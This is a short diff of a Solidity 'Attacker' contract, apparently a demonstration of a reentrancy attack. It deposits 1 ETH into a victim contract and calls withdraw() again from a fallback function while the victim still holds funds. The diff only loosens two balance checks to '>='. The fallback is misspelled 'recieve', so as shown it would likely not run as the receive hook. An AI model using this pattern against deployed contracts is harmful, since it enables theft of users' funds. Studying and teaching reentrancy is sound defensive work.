@@ -12,7 +12,7 @@ contract Attacker {
     }
 
     function attack() public payable {
-        require(msg.value>1 ether,"Send me some ETH to start");
+        require(msg.value>=1 ether,"Send me some ETH to start");
         victim.deposit{value: 1 ether}();
 
         victim.withdraw();
@@ -20,7 +20,7 @@ contract Attacker {
     }
 
     function recieve() public payable{
-        if(address(victim).balance>1 ether){
+        if(address(victim).balance>=1 ether){
             victim.withdraw();
         }
     }
